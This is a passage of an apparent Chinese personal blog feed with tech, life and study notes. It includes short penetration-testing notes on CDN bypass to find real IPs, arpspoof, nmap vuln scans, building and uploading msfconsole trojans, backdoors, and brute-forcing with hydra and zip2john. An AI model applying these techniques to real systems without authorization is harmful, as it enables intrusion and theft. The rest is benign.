云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a><br>
WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a></p>
<h2 id="查找真实IP">查找真实IP</h2>
<p>客户如果存在使用cdn的情况可以通过以下方法绕过CDN寻找真实IP</p>
<pre><code>1、内部邮箱源。一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找邮件头中的邮件服务器域名IP,ping这个邮件服务器的域名，就可以获得目标的真实IP（注意，必须是目标自己的邮件服务器，第三方或公共邮件服务器是没有用的）。
2、扫描网站测试文件，如phpinfo、test等，从而找到目标的真实IP。
3、分站域名。很多网站主站的访问量会比较大，所以主站都是挂CDN的，但是分站可能没有挂CDN，可以通过ping二级域名获取分站IP，可能会出现分站和主站不是同一个IP但在同一个C段下面的情况，从而能判断出目标的真实IP段。
4、国外访问。国内的CDN往往只对国内用户的访问加速，而国外的CDN就不一定了。因此，通过国外在线代理网站App Synthetic Monitor（https://asm.ca.com/en/ping.php）访问，可能会得到真实的IP
5、查询域名的解析记录。也许目标很久以前并没有用过CDN，所以可以通过网站NETCRAFT（https://www.netcraft.com/）来观察域名的IP历史记录，也可以大致分析出目标的真实IP段。
6、如果目标网站有自己的App，可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP。
7、绕过CloudFlare CDN查找真实IP。现在很多网站都使用CloudFlare提供的CDN服务，在确定了目标网站使用CDN后，可以先尝试通过在线网站Cloud FlareWatch（http://www.crimeflare.us/cfs.xhtml#box）对CloudFlare客户网站进行真实IP查询，结果如图1-12所示。
</code></pre>
<p>验证是否确实获取到了，文中给的方法是用ip或者似Masscan的工具验证</p>
<p>可以使用修改本机hosts访问域名再次验证。</p>
<h2 id="收集敏感目录文件">收集敏感目录文件</h2>
<p>工具推荐</p>
<p>针对网站目录的扫描主要有DirBuster、御剑后台扫描珍藏版、wwwscan、<a href="http://Spinder.py">Spinder.py</a>（轻量级快速单文件目录后台扫描）、Sensitivefilescan（轻量级快速单文件目录后台扫描）、Weakfilescan（轻量级快速单文件目录后台扫描）等</p>
<h2 id="社会工程学">社会工程学</h2>
<p>社工库</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>web安全攻防</category>
      </categories>
      <tags>
        <tag>web信息收集</tag>
        <tag>web安全攻防笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu-网卡配置文件</title>
    <url>/2025/07/09/ubuntu-%E7%BD%91%E5%8D%A1%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="dhcp">dhcp</h2>
<ol>
<li>打开网卡配置文件<code>/etc/netplan下的类似50-cloud-init.yaml写法的yaml文件</code>:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/netplan/50-cloud-init.yaml</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>开启dhcp自动获取地址</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: true</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>应用配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="静态地址">静态地址</h2>
<p>打开配置文件后，修改内容格式为：</p>
<ol>
<li>老版本</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: no</span><br><span class="line">    addresses: [192.168.11.10/24]</span><br><span class="line">    gateway4: 192.168.11.1</span><br><span class="line">    nameservers:</span><br><span class="line">      addresses: [223.5.5.5]</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>新版本写法</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ethernets:</span><br><span class="line">  ens33:</span><br><span class="line">    dhcp4: no</span><br><span class="line">    addresses: [192.168.11.10/24]</span><br><span class="line">    routes:</span><br><span class="line">      - to: 0.0.0.0/0</span><br><span class="line">        via: 192.168.11.2</span><br><span class="line">    nameservers:</span><br><span class="line">      addresses: [223.5.5.5]</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>应用配置</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>linux网卡配置</tag>
      </tags>
  </entry>
  <entry>
    <title>windows-好用软件</title>
    <url>/2025/02/24/windows-%E5%A5%BD%E7%94%A8%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="U盘工具">U盘工具</h2>
<h3 id="rufus">rufus</h3>
<blockquote>
<p>下载地址：<br>
<a href="https://rufus.ie/zh/">https://rufus.ie/zh/</a></p>
</blockquote>
<hr>
<h2 id="解压">解压</h2>
<h3 id="7zip">7zip</h3>
<blockquote>
<p>下载地址：<br>
<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p>
</blockquote>
<hr>
<h2 id="ssh远程工具">ssh远程工具</h2>
<h3 id="mobaxterm">mobaxterm</h3>
<blockquote>
<p>下载地址：<br>
<a href="https://mobaxterm.mobatek.net/download.html">https://mobaxterm.mobatek.net/download.html</a></p>
</blockquote>
<hr>
<h2 id="ps手柄驱动">ps手柄驱动</h2>
<h3 id="ds4-windows">ds4-windows</h3>
<p>windows使用ps手柄，会和steam手柄识别冲突</p>
<blockquote>
<p>下载地址：<br>
<a href="https://ds4-windows.com/download/ryochan7-ds4windows/">https://ds4-windows.com/download/ryochan7-ds4windows/</a></p>
</blockquote>
<hr>
<h2 id="远程同屏游戏">远程同屏游戏</h2>
<h3 id="Parsec">Parsec</h3>
<blockquote>
<p>下载地址：<br>
<a href="https://parsec.app/downloads">https://parsec.app/downloads</a></p>
</blockquote>
<hr>
<h2 id="文件检索">文件检索</h2>
<h3 id="everything">everything</h3>
<blockquote>
<p>下载地址：<br>
<a href="https://www.voidtools.com/zh-cn/downloads/">https://www.voidtools.com/zh-cn/downloads/</a></p>
</blockquote>
<hr>
<h2 id="控制手机">控制手机</h2>
<h3 id="anlink">anlink</h3>
<blockquote>
<p>下载地址：（或者windows商店）<br>
<a href="https://cn.anlinksoft.com/">https://cn.anlinksoft.com/</a></p>
</blockquote>
<hr>
<h2 id="ftp">ftp</h2>
<h3 id="universal-ftp-server">universal ftp server</h3>
<blockquote>
<p>下载地址：<br>
windows应用商店</p>
</blockquote>
<hr>
<h2 id="壁纸">壁纸</h2>
<h3 id="小红车">小红车</h3>
<blockquote>
<p>下载地址：<br>
steam搜索 <strong>Wallpaper Engine</strong></p>
</blockquote>
<h3 id="wallhaven网站">wallhaven网站</h3>
<blockquote>
<p>地址：<br>
<a href="https://wallhaven.cc/">https://wallhaven.cc/</a></p>
</blockquote>
<hr>
<h2 id="视频文件">视频文件</h2>
<h3 id="VLC">VLC</h3>
<blockquote>
<p>下载地址：（或者windows商店）<br>
<a href="https://www.videolan.org/vlc/index.zh_CN.html">https://www.videolan.org/vlc/index.zh_CN.html</a></p>
</blockquote>
<hr>
<h2 id="虚拟机">虚拟机</h2>
<h3 id="VM">VM</h3>
<blockquote>
<p>下载地址：<br>
<a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview</a></p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>好用软件</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>资源</tag>
      </tags>
  </entry>
  <entry>
    <title>windows域部署及管理</title>
    <url>/2025/04/26/windows%E5%9F%9F%E9%83%A8%E7%BD%B2%E5%8F%8A%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="windows域">windows域</h2>
<ul>
<li>单域：在网络中只建立了一个域</li>
<li>域树：具有连续域名空间的多个域</li>
<li>域林：由一个或者多个没有形成连续域名空的域树组成</li>
</ul>
<h2 id="创建域">创建域</h2>
<h3 id="ip和dns设置">ip和dns设置</h3>
<p>作为域控制器，也作为dns服务器，ip最好是固定不变的，可以设置静态，或者dhcp设置mac保留</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip：192.168.11.200</span><br><span class="line">dns：127.0.0.1</span><br></pre></td></tr></table></figure>
<h3 id="添加角色功能">添加角色功能</h3>
<ol>
<li>开始</li>
<li>基于角色或基于功能的安装</li>
<li>从服务器池中选择服务器<br>
服务器选择自己</li>
<li>服务器角色<br>
选中Active Directory 域服务<br>
点击添加功能</li>
<li>下一步直到安装完成</li>
<li>右上角黄色感叹号提示<br>
点击“将此服务器提升为域控制器”<br>
添加新林，设置根域名为“<a href="http://haha.com">haha.com</a>”<br>
dns和全局编录GC勾选，设置密码<br>
确认域名“HAHA”</li>
<li>下一步直到安装重启</li>
<li>安装成功，在服务器管理器中查看AD DS</li>
</ol>
<h3 id="域账号登录服务器">域账号登录服务器</h3>
<p>账号开始使用原来的账号加上@haha.com，或者是HAHA/账号登录</p>
<h2 id="加入域">加入域</h2>
<h3 id="dns设置">dns设置</h3>
<p>设置dns为DC域控制器的ip</p>
<h3 id="设置域">设置域</h3>
<ol>
<li>点开此电脑的属性</li>
<li>选择隶属于域：HAHA</li>
<li>登录管理员账号</li>
<li>重启后使用域账号登录</li>
</ol>
]]></content>
      <categories>
        <category>系统运维</category>
        <category>windows域</category>
      </categories>
      <tags>
        <tag>windows域</tag>
        <tag>AD DC</tag>
      </tags>
  </entry>
  <entry>
    <title>windows没有图形化页面</title>
    <url>/2025/04/26/windows%E6%B2%A1%E6%9C%89%E5%9B%BE%E5%BD%A2%E5%8C%96%E9%A1%B5%E9%9D%A2/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>如果安装windows时候选择了没有带gui的选项，仅核心，则会出现没有图形化的问题。</p>
<blockquote>
<p>以下的方法其实没什么用，不如重装，下面是我网上搜集来的方法，都没成功</p>
</blockquote>
<h2 id="检查图形化程序">检查图形化程序</h2>
<p>查找位置</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> /s explorer.exe</span><br></pre></td></tr></table></figure>
<p>找到可以运行试试</p>
<h2 id="安装图形化">安装图形化</h2>
<h3 id="安装gui">安装gui</h3>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">Install-WindowsFeature Server-Gui-Shell, Server-Gui-Mgmt-Infra</span><br></pre></td></tr></table></figure>
<h3 id="通过映像文件安装">通过映像文件安装</h3>
<p>d:对应的是d盘，如果iso文件是其他盘时改为对应盘符</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">dism /get-wiminfo /wimfile:d:\sources\install.wim</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>系统运维</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows图形化</tag>
        <tag>cmd</tag>
      </tags>
  </entry>
  <entry>
    <title>化妆笔记</title>
    <url>/2025/06/18/%E5%8C%96%E5%A6%86%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="🧴-妆前打底">🧴 妆前打底</h2>
<ul>
<li>厚涂乳或霜，直到皮肤摸起来黏黏的、无颗粒感 ✨<br>
👉 <strong>重点部位</strong>：鼻翼、额头、眼角（易卡粉处多揉）</li>
</ul>
<h2 id="🐼-黑眼圈遮盖">🐼 黑眼圈遮盖</h2>
<ol>
<li>用指腹打圈激活遮瑕🌀</li>
<li>用扁平刷沾取遮瑕，从黑眼圈外缘下笔，往上晕染 🌫️</li>
<li>涂眼角、眼尾、眼皮色素沉着区域 🖌️</li>
<li>⚠️ 不遮住卧蚕，边缘自然过渡</li>
</ol>
<h2 id="🧊-隔离霜">🧊 隔离霜</h2>
<ul>
<li>挤手上晕开后上脸（嘴角、鼻翼、下巴、额头）🌈</li>
<li>避开遮瑕区域 ❌</li>
</ul>
<h2 id="🧽-粉底液">🧽 粉底液</h2>
<ul>
<li>手上晕开，用粉扑轻拍上脸（不要等干才拍）💧</li>
<li>上够量，不然易斑驳 ❗</li>
<li>如果起皮或不服帖，用湿巾擦掉重来 🔄</li>
</ul>
<h2 id="✨-液体提亮">✨ 液体提亮</h2>
<p>🔺 在以下部位画小三角并拍开：</p>
<ul>
<li>法令纹下、眼下、下巴、额头、鼻梁、鼻头、眉骨</li>
</ul>
<h2 id="🟤-遮瑕（二次）">🟤 遮瑕（二次）</h2>
<ul>
<li>用深色遮痘印、痣</li>
<li>手上晕开再上脸，小面积局部修饰 🕳️</li>
</ul>
<h2 id="🌸-膏状腮红">🌸 膏状腮红</h2>
<ul>
<li>手上铺开后再上脸</li>
<li>中间颜色深，两侧浅，晕染过渡自然 🎨</li>
</ul>
<h2 id="🧻-定妆">🧻 定妆</h2>
<ul>
<li>用干粉扑蘸定妆粉，手上晕开再上脸</li>
<li>按压上妆，直到摸起来滑滑的不黏腻 🌬️</li>
</ul>
<h2 id="🍑-腮红粉">🍑 腮红粉</h2>
<ul>
<li>抖掉多余粉末后轻扫上脸，可延伸至眼影区 🎀</li>
</ul>
<h2 id="🪄-阴影修容">🪄 阴影修容</h2>
<ul>
<li>浅+深色混合沾取，抖粉后上脸 🖌️</li>
<li>山根画“C”形，顺眼窝到眉骨 🌙</li>
<li>鼻尖“小c”向下晕染，注意山根和鼻尖别连线！🛑</li>
<li>人中、下唇中间也上些修容 👃👄</li>
<li>眼尾、眉骨补上小“C”增强骨相</li>
</ul>
<h2 id="💡-高光">💡 高光</h2>
<ul>
<li>
<p>沾取白色高光 ✨ 抖粉后提亮：</p>
<ul>
<li>山根、鼻头、鼻翼、眼骨、眼下三角区</li>
<li>法令纹、下巴、嘴角向上、太阳穴</li>
</ul>
</li>
</ul>
<h2 id="🎨-眼影步骤">🎨 眼影步骤</h2>
<h3 id="🌡️-色调搭配">🌡️ 色调搭配</h3>
<ul>
<li>统一冷暖色调 ❄️🔥，避免混用</li>
</ul>
<h3 id="👁️-操作步骤">👁️ 操作步骤</h3>
<ol>
<li>
<p><strong>大号刷 + 浅色</strong></p>
<ul>
<li>打底，大面积扫眼窝（后宽前窄）</li>
</ul>
</li>
<li>
<p><strong>中号刷 + 第二浅色</strong></p>
<ul>
<li>从睫毛根部开始，左右扫再向上晕染</li>
</ul>
</li>
<li>
<p><strong>小号刷</strong></p>
<ul>
<li>从后眼尾往前带色，边缘自然 🌫️</li>
</ul>
</li>
<li>
<p><strong>调整加深</strong>：贴睫毛后若不够浓可补色</p>
</li>
</ol>
<h2 id="👀-假睫毛-睫毛夹">👀 假睫毛 &amp; 睫毛夹</h2>
<h3 id="🔧-夹睫毛">🔧 夹睫毛</h3>
<ul>
<li>睫毛夹靠近睫毛根部夹两下，抬手腕二次加压</li>
</ul>
<h3 id="🧷-贴假睫毛">🧷 贴假睫毛</h3>
<ul>
<li>上下睫毛配合协调 ✅</li>
<li>镊子干净无胶 💅</li>
<li>胶干到半湿时贴上，推一推更服帖 👁️</li>
</ul>
<h3 id="⬇️-下睫毛">⬇️ 下睫毛</h3>
<ul>
<li>呈放射状贴，不要贴成直线</li>
<li>第1簇从眼白一半处开始贴，贴好后轻推 ✅</li>
</ul>
<blockquote>
<p>✨ 贴好后可加深眼影</p>
</blockquote>
<h2 id="🌈-卧蚕（眼睑下至）">🌈 卧蚕（眼睑下至）</h2>
<ul>
<li>刀锋刷沾色，从瞳孔下方晕染到眼白前后1/2</li>
<li>打造“亮-暗-亮”结构的立体卧蚕 💫</li>
</ul>
<h2 id="✂️-双眼皮贴">✂️ 双眼皮贴</h2>
<ul>
<li>从中间开始贴，压褶皱线</li>
<li>可剪半片贴右眼，调高后眼皮线 👁️</li>
</ul>
<h2 id="🖋️-眼线">🖋️ 眼线</h2>
<ol>
<li>先用眉笔打草图 ✏️</li>
<li>连接两段线条并填色</li>
<li>补画后三分之一内眼线 🎯</li>
</ol>
<h2 id="✨-闪片点缀">✨ 闪片点缀</h2>
<ul>
<li>眼中段、眼头处可加亮片 💎</li>
<li>用干净刷子在卧蚕提亮，形成明暗对比 ✨</li>
</ul>
]]></content>
      <categories>
        <category>生活</category>
        <category>化妆</category>
      </categories>
      <tags>
        <tag>生活</tag>
        <tag>化妆</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>压缩包密码爆破</title>
    <url>/2024/08/10/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="使用zip2john-hash值破解">使用zip2john hash值破解</h2>
<p>生成压缩包hash值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john filename.zip &gt; hash.txt</span><br></pre></td></tr></table></figure>
<p>开始破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>kali</tag>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>图转线条画</title>
    <url>/2025/05/28/%E5%9B%BE%E8%BD%AC%E7%BA%BF%E6%9D%A1%E7%94%BB/</url>
    <content><![CDATA[<h2 id="前言">前言</h2>
<p>该方法均通过互联网上网页工具实现。</p>
<h2 id="图转SVG">图转SVG</h2>
<p>先将图片转成svg矢量图，上传图片转换即可<br>
<img src="/images/pasted-94.png" alt="upload successful"></p>
<blockquote>
<p>工具链接：<br>
<a href="https://picsvg.com/">https://picsvg.com/</a></p>
</blockquote>
<h2 id="SVG转html">SVG转html</h2>
<p>让svg动起来，上传svg图片即可复制代码<br>
<img src="/images/pasted-95.png" alt="upload successful"></p>
<blockquote>
<p>工具链接：<br>
<a href="https://svgartista.netlify.app/">https://svgartista.netlify.app/</a></p>
</blockquote>
<h2 id="html转pug">html转pug</h2>
<p>代码格式转换</p>
<blockquote>
<p>工具链接：<br>
<a href="https://html-to-pug.com/">https://html-to-pug.com/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>代码</category>
        <category>娱乐</category>
      </categories>
      <tags>
        <tag>工具</tag>
        <tag>hexo</tag>
        <tag>html</tag>
        <tag>图片</tag>
        <tag>svg</tag>
      </tags>
  </entry>
  <entry>
    <title>奇异人生-【汉化包】</title>
    <url>/2025/06/22/%E5%A5%87%E5%BC%82%E4%BA%BA%E7%94%9F-%E3%80%90%E6%B1%89%E5%8C%96%E5%8C%85%E3%80%91/</url>
    <content><![CDATA[<h2 id="下载地址">下载地址</h2>
<p>汉化组：</p>
<blockquote>
<p><a href="https://hutoulang.com/into/33.html">https://hutoulang.com/into/33.html</a></p>
</blockquote>
<blockquote>
<p>下载地址：<br>
蓝奏云：<a href="https://wwf.lanzouj.com/iOJBJ1wt604d">https://wwf.lanzouj.com/iOJBJ1wt604d</a><br>
密码:2bjy</p>
</blockquote>
<h2 id="安装">安装</h2>
<p>解压后放到<code>游戏根目录</code>双击即可</p>
<p>如果游戏中没有开启字幕，需要手动开启一下</p>
]]></content>
      <categories>
        <category>游戏</category>
        <category>汉化</category>
      </categories>
      <tags>
        <tag>奇异人生</tag>
        <tag>游戏汉化</tag>
      </tags>
  </entry>
  <entry>
    <title>安全-内网渗透</title>
    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h2 id="信息收集">信息收集</h2>
<p>主机存活<br>
ettercap -G 蜘蛛<br>
nmap<br>
nmap -sS 网段</p>
<p>漏洞搜集<br>
awvs			网站扫描<br>
gvm(openvas)	系统扫描<br>
nmap<br>
nmap --script=vuln //常见漏洞<br>
nmap --script-default //默认收集信息脚本</p>
<h2 id="进入目标后">进入目标后</h2>
<p>提权<br>
创建高权限用户<br>
windows<br>
net use<br>
linux<br>
user add</p>
<p>留后门<br>
创建木马<br>
木马(msfconsole)<br>
上传木马<br>
meterpreter<br>
upload</p>
<h2 id="攻击方式">攻击方式</h2>
<p>改变流量走向<br>
ettercap(arp欺骗、dns劫持等)<br>
arpspoof<br>
arpspoof -i 网卡名称 -t 目标IP 网关</p>
<p>爆破密码<br>
hydra（九头蛇）<br>
msfconsole（爆破密码模块）</p>
<p>漏洞攻击<br>
msfconsole（漏洞攻击目录）</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>kali</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>数据通信基础-公式</title>
    <url>/2025/06/25/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%9F%BA%E7%A1%80-%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="信道带宽（W）">信道带宽（W）</h2>
<p><code>信道带宽</code>为最高频率($f_2$)减最低频率($f_1$)<br>
$$<br>
W = f_2 - f_1<br>
$$</p>
<hr>
<h2 id="奈奎斯特定理（B）">奈奎斯特定理（B）</h2>
<ul>
<li>
<p>信号码元宽度为T秒，也相当于周期，则可以得出<code>码元速率</code>公式：<br>
$$<br>
B = \frac{1}{T}<br>
$$</p>
</li>
<li>
<p>奈奎斯特(Hany Nyquist)就推导出了有限带宽<code>无噪声信道</code>的最大码元速率(极限波特率)，称为奈奎斯特定理:<br>
若信道带宽为W,则奈奎斯特定理指出<code>最大码元速率</code>为<br>
$$<br>
B = 2W<br>
$$</p>
</li>
</ul>
<hr>
<h2 id="一个码元的信息量与种类（n、N）">一个码元的信息量与种类（n、N）</h2>
<p>一个码元携带的<code>信息量n(位)</code>与<code>码元的种类数N</code>有如下关系<br>
$$<br>
n = \log_2 N<br>
$$</p>
<h2 id="香农定理（C）、数据速率（R）">香农定理（C）、数据速率（R）</h2>
<p>单位时间内在信道上传送的信息量(位数)称为数据速率</p>
<ul>
<li>
<p>无噪声环境数据速率：<br>
$$<br>
R = B \log_2 N = 2W \log_2 N<br>
$$</p>
</li>
<li>
<p>有噪声信道的<code>极限数据速率</code>(香农定理)：<br>
$$<br>
C = W \log_2 \left(1 + \frac{S}{N}\right)<br>
$$</p>
<ol>
<li>S 为信号的平均功率，N 为噪声平均功率， \frac{S}{N}\right 叫作信噪比。由于在实际使用中S与N的比值太大，故常取其分贝数(dB)。分贝与信噪比的关系为：<br>
$$<br>
\text{dB} = 10 \log_{10} \frac{S}{N}<br>
$$</li>
<li>常见<br>
S/N=1000时，信噪比为30dB<br>
S/N=10时，信噪比为10dB</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>网络工程师</category>
      </categories>
      <tags>
        <tag>网络工程师</tag>
        <tag>软考</tag>
      </tags>
  </entry>
  <entry>
    <title>正则表达式符号大全</title>
    <url>/2025/07/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%A6%E5%8F%B7%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<h2 id="普通字符（最基础）">普通字符（最基础）</h2>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>a</code>~<code>z</code></td>
<td>字母本身</td>
<td><code>abc</code> 匹配 “abc”</td>
</tr>
<tr>
<td><code>0</code>~<code>9</code></td>
<td>数字本身</td>
<td><code>123</code> 匹配 “123”</td>
</tr>
<tr>
<td>其他符号</td>
<td>除特殊字符外，其它字符本身</td>
<td><code>@#-</code> 匹配这些字符</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="元字符（具有特殊意义）">元字符（具有特殊意义）</h2>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>.</code></td>
<td>任意单个字符（除换行）</td>
<td><code>a.c</code> 匹配 <code>abc</code>、<code>a1c</code></td>
</tr>
<tr>
<td><code>^</code></td>
<td>匹配字符串开头</td>
<td><code>^abc</code> 匹配以 <code>abc</code> 开头</td>
</tr>
<tr>
<td><code>$</code></td>
<td>匹配字符串结尾</td>
<td><code>abc$</code> 匹配以 <code>abc</code> 结尾</td>
</tr>
<tr>
<td><code>[]</code></td>
<td>字符集，匹配其中任一字符</td>
<td><code>[abc]</code> 匹配 <code>a</code>、<code>b</code>、<code>c</code></td>
</tr>
<tr>
<td><code>[^]</code></td>
<td>排除字符集，匹配不在其中的字符</td>
<td><code>[^abc]</code> 匹配非 <code>a</code>、<code>b</code>、<code>c</code> 的字符</td>
</tr>
<tr>
<td><code>|</code></td>
<td>或操作，匹配左右任一模式</td>
<td><code>a|b</code> 匹配 <code>a</code> 或 <code>b</code></td>
</tr>
<tr>
<td><code>()</code></td>
<td>分组，可用于提取或重复</td>
<td><code>(abc)+</code> 匹配 “abcabc”</td>
</tr>
<tr>
<td><code>\</code></td>
<td>转义字符，用于匹配特殊符号本身</td>
<td><code>\.</code> 匹配字面上的点号 <code>.</code></td>
</tr>
</tbody>
</table>
<hr>
<h2 id="数量词（表示重复次数）">数量词（表示重复次数）</h2>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*</code></td>
<td>匹配前一项 <strong>0次或多次</strong></td>
<td><code>a*</code> 可匹配 “”, “a”, “aaa”</td>
</tr>
<tr>
<td><code>+</code></td>
<td>匹配前一项 <strong>1次或多次</strong></td>
<td><code>a+</code> 匹配 “a”, “aa” 等</td>
</tr>
<tr>
<td><code>?</code></td>
<td>匹配前一项 <strong>0次或1次</strong></td>
<td><code>a?</code> 匹配 “” 或 “a”</td>
</tr>
<tr>
<td><code>&#123;n&#125;</code></td>
<td>匹配前一项 <strong>恰好 n 次</strong></td>
<td><code>a&#123;3&#125;</code> 匹配 “aaa”</td>
</tr>
<tr>
<td><code>&#123;n,&#125;</code></td>
<td>匹配前一项 <strong>至少 n 次</strong></td>
<td><code>a&#123;2,&#125;</code> 匹配 “aa”, “aaa”, …</td>
</tr>
<tr>
<td><code>&#123;n,m&#125;</code></td>
<td>匹配前一项 <strong>n 到 m 次之间</strong></td>
<td><code>a&#123;1,3&#125;</code> 匹配 “a”, “aa”, “aaa”</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="懒惰匹配（非贪婪）">懒惰匹配（非贪婪）</h2>
<blockquote>
<p>默认所有数量词都是<strong>贪婪的</strong>（尽量多匹配），加上 <code>?</code> 变成<strong>非贪婪</strong>（尽量少匹配）</p>
</blockquote>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>*?</code></td>
<td>0次以上，尽可能少匹配</td>
<td><code>&lt;.*?&gt;</code> 匹配 <code>&lt;h1&gt;</code> 而非整个标签组</td>
</tr>
<tr>
<td><code>+?</code></td>
<td>1次以上，尽可能少匹配</td>
<td><code>&quot;.+?&quot;</code> 匹配最短一对引号之间内容</td>
</tr>
<tr>
<td><code>??</code></td>
<td>0或1次，尽可能少匹配</td>
<td><code>a??</code> 有也匹配，无也匹配（偏向少）</td>
</tr>
<tr>
<td><code>&#123;n,m&#125;?</code></td>
<td>n到m次，尽可能少</td>
<td><code>a&#123;2,5&#125;?</code> 匹配2~5个a，越少越好</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="定位符（锚点）">定位符（锚点）</h2>
<table>
<thead>
<tr>
<th>符号</th>
<th>位置匹配作用</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>^</code></td>
<td>匹配字符串开头</td>
<td><code>^abc</code> 只匹配 “abc” 出现在开头</td>
</tr>
<tr>
<td><code>$</code></td>
<td>匹配字符串结尾</td>
<td><code>abc$</code> 只匹配 “abc” 出现在末尾</td>
</tr>
<tr>
<td><code>\b</code></td>
<td>单词边界（前后是非\w）</td>
<td><code>\bword\b</code> 匹配整个单词</td>
</tr>
<tr>
<td><code>\B</code></td>
<td>非单词边界</td>
<td><code>\Bword\B</code> 匹配“词中”的 word</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="转义字符（特殊含义字符）">转义字符（特殊含义字符）</h2>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
<th>等价于</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>\d</code></td>
<td>匹配数字（0-9）</td>
<td><code>[0-9]</code></td>
</tr>
<tr>
<td><code>\D</code></td>
<td>匹配非数字</td>
<td><code>[^0-9]</code></td>
</tr>
<tr>
<td><code>\w</code></td>
<td>匹配单词字符（字母、数字、下划线）</td>
<td><code>[a-zA-Z0-9_]</code></td>
</tr>
<tr>
<td><code>\W</code></td>
<td>匹配非单词字符</td>
<td><code>[^a-zA-Z0-9_]</code></td>
</tr>
<tr>
<td><code>\s</code></td>
<td>匹配空白字符（空格、Tab、换行等）</td>
<td><code>[ \t\r\n\f]</code></td>
</tr>
<tr>
<td><code>\S</code></td>
<td>匹配非空白字符</td>
<td><code>[^ \t\r\n\f]</code></td>
</tr>
<tr>
<td><code>\\</code></td>
<td>匹配反斜线 <code>\</code></td>
<td>-</td>
</tr>
<tr>
<td><code>\.</code></td>
<td>匹配点号 <code>.</code> 本身</td>
<td>-</td>
</tr>
</tbody>
</table>
<hr>
<h2 id="其他语法（进阶）">其他语法（进阶）</h2>
<table>
<thead>
<tr>
<th>语法</th>
<th>含义</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>(?:...)</code></td>
<td>非捕获分组（不参与 group 提取）</td>
<td><code>(?:abc)+</code></td>
</tr>
<tr>
<td><code>(?=...)</code></td>
